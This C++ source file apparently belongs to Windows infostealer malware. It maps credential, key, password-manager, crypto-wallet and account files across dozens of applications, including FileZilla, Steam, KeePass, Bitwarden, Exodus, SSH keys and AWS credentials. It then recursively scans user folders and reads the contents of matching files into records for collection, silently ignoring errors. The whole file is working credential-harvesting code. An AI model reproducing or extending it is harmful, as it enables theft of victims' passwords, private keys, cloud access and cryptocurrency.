#include "important_files.h"
#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <iostream>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <map>
#include <vector>

namespace fs = std::filesystem;

// Maximum file size to read content (1MB)
const long long MAX_FILE_SIZE_FOR_CONTENT = 1024 * 1024;

// Application-specific file patterns
const std::map<std::string, std::vector<std::string>> APP_SPECIFIC_FILES = {
    {"FileZilla", {"sitemanager.xml", "recentservers.xml", "filezilla.xml"}},
    {"Steam", {"*.vdf", "*.tmp", "config.vdf", "loginusers.vdf"}},
    {"Outlook", {"*.ost", "*.pst"}},
    {"Thunderbird", {"logins.json", "key4.db"}},
    {"WinSCP", {"winscp.ini"}},
    {"CiscoVPN", {"*.xml"}},
    {"OpenVPN", {"*.ovpn", "config.json"}},
    {"HeidiSQL", {"heidisql_settings.xml", "sessions.xml"}},
    {"DBeaver", {"*.dbeaver-data-sources.xml"}},
    {"VSCode", {"settings.json", "state.vscdb"}},
    {"Git", {".git-credentials"}},
    {"KeePass", {"*.kdbx", "*.kdb"}},
    {"Discord", {"*.ldb", "*.log"}},
    {"TeamViewer", {"connections.xml", "teamviewer.ini"}},
    {"RemoteDesktop", {"*.rdp"}},
    {"Cyberduck", {"bookmarks.plist"}},
    {"7Zip", {"7zfm.ini"}},
    {"Norton", {"*"}}, // All files
    {"Origin", {"*"}}, // All files
    {"PrismLauncher", {"accounts.json"}},
    {"MultiMC", {"accounts.json"}},
    {"LunarClient", {"accounts.json"}},
    {"Feather", {"accounts.json"}},
    {"TLauncher", {"tlauncherprofiles.json"}},
    {"Essential", {"microsoft_accounts.json"}},
    {"ATLauncher", {"accounts.json"}},
    {"1Password", {"*.sqlite"}},
    {"AnyDesk", {"*.conf"}},
    {"AutoFTPManager", {"autoftpmanagersettings.db"}},
    {"CloudCredentials", {"*", "msal.cache", "msalv2.cache", "*.db", "*.json"}},
    {"Bitwarden", {"data.json"}},
    {"FTPManagerLite", {"ftpmanagerlitesettings.db"}},
    {"FTPRush", {"rushsite.xml"}},
    {"GoogleCloud", {"*.db", "*.json"}},
    {"NordPass", {"nordpass.json", "nordpass.sqlite"}},
    {"NordVPN", {"user.config"}},
    {"ProtonVPN", {"user.config"}},
    {"RealVNC", {"*"}}, // All files
    {"SmartFTP", {"*"}}, // All files
    {"TightVNC", {"*"}}, // All files
    {"TotalCommander", {"wcx_ftp.ini"}},
    {"UltraVNC", {"*"}}, // All files
    {"ExodusWallet", {"*.seco", "passphrase.json"}},
    {"RiotGames", {"riotgamesprivatesettings.yaml"}},
    {"SSH", {"id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "known_hosts", "authorized_keys"}},
    {"AWS", {"credentials", "config"}}
};

// Application-specific paths (additional search locations beyond the main config path)
const std::map<std::string, std::vector<std::string>> APP_ADDITIONAL_PATHS = {
    {"Git", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents", "%USERPROFILE%\\Downloads"}},
    {"KeePass", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Documents", "%USERPROFILE%\\Dropbox", "%USERPROFILE%\\OneDrive"}},
    {"RemoteDesktop", {"%USERPROFILE%\\Desktop", "%USERPROFILE%\\Downloads"}},
    {"Steam", {"C:\\Program Files (x86)\\Steam\\config"}},
    {"Origin", {"C:\\ProgramData\\Origin", "%USERPROFILE%\\AppData\\Local\\Origin"}}
};

std::string expand_environment_variables(const std::string& path) {
    char expandedPath[MAX_PATH];
    DWORD result = ExpandEnvironmentStringsA(path.c_str(), expandedPath, MAX_PATH);

    if (result == 0 || result > MAX_PATH) {
        // Expansion failed or buffer too small, return original
        return path;
    }

    return std::string(expandedPath);
}

bool matches_file_pattern(const std::string& filename, const std::string& pattern) {
    std::string lowerFilename = filename;
    std::string lowerPattern = pattern;
    std::transform(lowerFilename.begin(), lowerFilename.end(), lowerFilename.begin(), ::tolower);
    std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::tolower);

    // Handle wildcards
    if (pattern == "*") {
        return true; // Match all files
    }

    if (pattern.find('*') != std::string::npos) {
        // Simple wildcard matching for *.ext patterns
        size_t starPos = pattern.find('*');
        if (starPos == 0 && pattern.length() > 1 && pattern[1] == '.') {
            // Pattern like *.ext
            std::string ext = pattern.substr(1); // .ext
            return lowerFilename.length() >= ext.length() &&
                   lowerFilename.substr(lowerFilename.length() - ext.length()) == ext;
        }
    }

    // Exact match (case-insensitive)
    return lowerFilename == lowerPattern;
}

bool is_important_file_for_app(const std::string& filename, const std::string& appName) {
    auto it = APP_SPECIFIC_FILES.find(appName);
    if (it != APP_SPECIFIC_FILES.end()) {
        for (const auto& pattern : it->second) {
            if (matches_file_pattern(filename, pattern)) {
                return true;
            }
        }
    }
    return false;
}

std::optional<std::string> read_file_content(const std::string& filePath, long long maxSize) {
    try {
        fs::path path(filePath);

        // Check if file exists and get size
        if (!fs::exists(path) || !fs::is_regular_file(path)) {
            return std::nullopt;
        }

        auto fileSize = fs::file_size(path);
        if (fileSize > maxSize || fileSize == 0) {
            return std::nullopt; // File too large or empty
        }

        // Try to read as text file
        std::ifstream file(path, std::ios::binary);
        if (!file.is_open()) {
            return std::nullopt;
        }

        std::stringstream buffer;
        buffer << file.rdbuf();
        file.close();

        std::string content = buffer.str();

        // Check if content is valid text (basic check)
        bool isText = true;
        for (char c : content) {
            if (c < 32 && c != '\n' && c != '\r' && c != '\t') {
                isText = false;
                break;
            }
        }

        return isText ? std::optional<std::string>(content) : std::nullopt;

    } catch (const std::exception&) {
        return std::nullopt;
    }
}

std::optional<std::pair<long long, std::string>> get_file_info(const std::string& filePath) {
    try {
        fs::path path(filePath);

        if (!fs::exists(path) || !fs::is_regular_file(path)) {
            return std::nullopt;
        }

        auto fileSize = fs::file_size(path);
        // Get last modified time using Windows API
        HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr,
                                  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        std::string lastModified = "Unknown";
        if (hFile != INVALID_HANDLE_VALUE) {
            FILETIME ftCreate, ftAccess, ftWrite;
            if (GetFileTime(hFile, &ftCreate, &ftAccess, &ftWrite)) {
                SYSTEMTIME st;
                if (FileTimeToSystemTime(&ftWrite, &st)) {
                    std::stringstream ss;
                    ss << st.wYear << "-" << std::setfill('0') << std::setw(2) << st.wMonth << "-"
                       << std::setfill('0') << std::setw(2) << st.wDay << " "
                       << std::setfill('0') << std::setw(2) << st.wHour << ":"
                       << std::setfill('0') << std::setw(2) << st.wMinute << ":"
                       << std::setfill('0') << std::setw(2) << st.wSecond;
                    lastModified = ss.str();
                }
            }
            CloseHandle(hFile);
        }

        return std::make_pair(fileSize, lastModified);

    } catch (const std::exception&) {
        return std::nullopt;
    }
}

void scan_directory_for_files(const std::string& directory, const std::string& appName,
                            std::vector<ImportantFile>& files, int maxDepth) {
    try {
        fs::path dirPath(directory);

        if (!fs::exists(dirPath) || !fs::is_directory(dirPath)) {
            return;
        }

        // Use recursive directory iterator with depth limit
        auto iterator = fs::recursive_directory_iterator(
            dirPath,
            fs::directory_options::skip_permission_denied
        );

        for (const auto& entry : iterator) {
            // Check depth limit
            if (iterator.depth() > maxDepth) {
                iterator.disable_recursion_pending();
                continue;
            }

            if (!entry.is_regular_file()) {
                continue;
            }

            std::string filePath = entry.path().string();
            std::string fileName = entry.path().filename().string();

            // Check if file is important for this application
            if (!is_important_file_for_app(fileName, appName)) {
                continue;
            }

            // Get file info
            auto fileInfo = get_file_info(filePath);
            if (!fileInfo) {
                continue;
            }

            long long fileSize = fileInfo->first;
            std::string lastModified = fileInfo->second;

            // Determine file type based on extension
            std::string fileType = "Other";
            std::string lowerFileName = fileName;
            std::transform(lowerFileName.begin(), lowerFileName.end(), lowerFileName.begin(), ::tolower);

            if (lowerFileName.find(".key") != std::string::npos ||
                lowerFileName.find(".pem") != std::string::npos ||
                lowerFileName.find(".crt") != std::string::npos ||
                lowerFileName.find(".cer") != std::string::npos ||
                lowerFileName.find(".p12") != std::string::npos ||
                lowerFileName.find(".pfx") != std::string::npos) {
                fileType = "Certificate/Key";
            } else if (lowerFileName.find(".db") != std::string::npos ||
                       lowerFileName.find(".sqlite") != std::string::npos) {
                fileType = "Database";
            } else if (lowerFileName.find(".wallet") != std::string::npos ||
                       lowerFileName.find(".dat") != std::string::npos) {
                fileType = "Wallet";
            } else if (lowerFileName.find(".config") != std::string::npos ||
                       lowerFileName.find(".ini") != std::string::npos ||
                       lowerFileName.find(".cfg") != std::string::npos ||
                       lowerFileName.find(".conf") != std::string::npos) {
                fileType = "Configuration";
            } else if (lowerFileName.find(".log") != std::string::npos) {
                fileType = "Log";
            } else if (lowerFileName.find(".txt") != std::string::npos) {
                fileType = "Text";
            } else if (lowerFileName.find(".json") != std::string::npos ||
                       lowerFileName.find(".xml") != std::string::npos) {
                fileType = "Data";
            } else if (lowerFileName.find(".rdp") != std::string::npos ||
                       lowerFileName.find(".vpn") != std::string::npos ||
                       lowerFileName.find(".ovpn") != std::string::npos) {
                fileType = "Connection";
            } else if (lowerFileName.find(".ppk") != std::string::npos ||
                       lowerFileName.find(".pub") != std::string::npos ||
                       lowerFileName.find(".priv") != std::string::npos) {
                fileType = "SSH Key";
            }

            // Try to read file content for smaller files
            std::optional<std::string> fileContent;
            if (fileSize <= MAX_FILE_SIZE_FOR_CONTENT) {
                fileContent = read_file_content(filePath, MAX_FILE_SIZE_FOR_CONTENT);
            }

            // Create ImportantFile object
            ImportantFile importantFile;
            importantFile.fileName = fileName;
            importantFile.fileType = fileType;
            importantFile.filePath = filePath;
            importantFile.fileSize = fileSize;
            importantFile.lastModified = lastModified;
            importantFile.fileContent = fileContent;

            files.push_back(importantFile);

            // Limit total files per app to prevent excessive collection
            if (files.size() >= 50) {
                break;
            }
        }

    } catch (const std::exception&) {
        // Silently ignore directory scanning errors
    }
}

std::vector<ImportantFile> extract_important_files(const std::vector<ImportantFileConfig>& config) {
    std::vector<ImportantFile> allFiles;

    for (const auto& fileConfig : config) {
        if (!fileConfig.enabled) {
            continue;
        }

        // Expand environment variables in path
        std::string expandedPath = expand_environment_variables(fileConfig.path);

        // Scan the main configured directory
        scan_directory_for_files(expandedPath, fileConfig.appName, allFiles);

        // Special handling for Git - look for .git directories
        if (fileConfig.appName == "Git") {
            try {
                std::vector<std::string> gitSearchPaths = {expandedPath};
                auto additionalPathsIt = APP_ADDITIONAL_PATHS.find(fileConfig.appName);
                if (additionalPathsIt != APP_ADDITIONAL_PATHS.end()) {
                    for (const auto& additionalPath : additionalPathsIt->second) {
                        gitSearchPaths.push_back(expand_environment_variables(additionalPath));
                    }
                }

                for (const auto& searchPath : gitSearchPaths) {
                    fs::path searchDir(searchPath);
                    if (fs::exists(searchDir) && fs::is_directory(searchDir)) {
                        // Look for .git directories and scan them
                        for (const auto& entry : fs::directory_iterator(searchDir)) {
                            if (entry.is_directory() && entry.path().filename() == ".git") {
                                scan_directory_for_files(entry.path().string(), fileConfig.appName, allFiles, 1);
                            }
                        }
                    }
                }
            } catch (const std::exception&) {
                // Fall back to normal scanning if special handling fails
                scan_directory_for_files(expandedPath, fileConfig.appName, allFiles);
            }
        } else {
            // Check for additional search paths for other specific applications
            auto additionalPathsIt = APP_ADDITIONAL_PATHS.find(fileConfig.appName);
            if (additionalPathsIt != APP_ADDITIONAL_PATHS.end()) {
                for (const auto& additionalPath : additionalPathsIt->second) {
                    std::string expandedAdditionalPath = expand_environment_variables(additionalPath);
                    scan_directory_for_files(expandedAdditionalPath, fileConfig.appName + "_Extra", allFiles);
                }
            }
        }
    }

    return allFiles;
}
